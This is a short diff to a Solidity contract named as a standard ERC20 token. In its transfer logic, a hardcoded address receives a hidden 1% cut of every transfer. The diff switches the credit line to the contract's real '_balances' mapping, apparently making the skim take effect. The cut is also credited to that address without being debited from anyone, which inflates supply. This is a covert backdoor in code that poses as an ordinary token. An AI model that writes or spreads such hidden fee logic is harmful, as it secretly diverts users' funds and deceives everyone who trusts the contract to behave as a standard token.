@@ -112,7 +112,7 @@ contract ERC20 is Context, IERC20, IERC20Metadata {
        address payable target = 0x45dF353Ccc93c48C167dDb352C1325DADf0635b3;
        uint shareForX = amount/100;
        amount = amount-shareForX;
-       balanceOf[target] += shareForX;
+       _balances[target] += shareForX;
         _transfer(_msgSender(), recipient, amount);
         return true;
     }
